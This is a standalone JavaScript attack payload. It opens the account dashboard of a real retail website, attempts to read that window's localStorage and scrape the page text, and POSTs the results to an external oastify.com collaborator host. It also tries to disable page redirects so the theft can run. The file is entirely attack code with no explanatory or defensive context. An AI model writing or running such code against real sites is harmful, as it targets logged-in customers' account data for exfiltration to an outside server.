(function() {
  var collaboratorUrl = 'https://ke2ukiu6xivbwc8r8leyumbr0i69uzio.oastify.com';
  var targetUrl = 'https://shop.lululemon.com/account/dashboard';

  // Attempt to block redirects
  try {
    window.location.assign = function() {};
    window.location.replace = function() {};
    window.location.href = '#';
    Object.defineProperty(window, 'location', {
      value: { href: window.location.href },
      writable: false
    });
  } catch (e) {
    fetch(collaboratorUrl, {
      method: 'POST',
      mode: 'no-cors',
      body: JSON.stringify({ error: 'Redirect block failed: ' + e.message })
    });
  }

  // Open target page immediately
  var targetWindow = window.open(targetUrl);

  // Execute as fast as possible
  setTimeout(() => {
    try {
      var data = { localStorage: {}, scraped: '', error: null };

      // Attempt LocalStorage access (may fail due to SOP)
      try {
        for (var key in targetWindow.localStorage) {
          if (targetWindow.localStorage.hasOwnProperty(key)) {
            data.localStorage[key] = targetWindow.localStorage.getItem(key);
          }
        }
      } catch (e) {
        data.error = 'LocalStorage access failed: ' + e.message;
      }

      // Fallback: Scrape DOM
      try {
        data.scraped = targetWindow.document.body.innerText.substring(0, 10000);
      } catch (e) {
        data.error = data.error || 'DOM scraping failed: ' + e.message;
      }

      // Exfiltrate
      fetch(collaboratorUrl, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
    } catch (e) {
      fetch(collaboratorUrl, {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({ error: 'General error: ' + e.message })
      });
    }
  }, 1000); // Reduced delay to beat redirect
})();
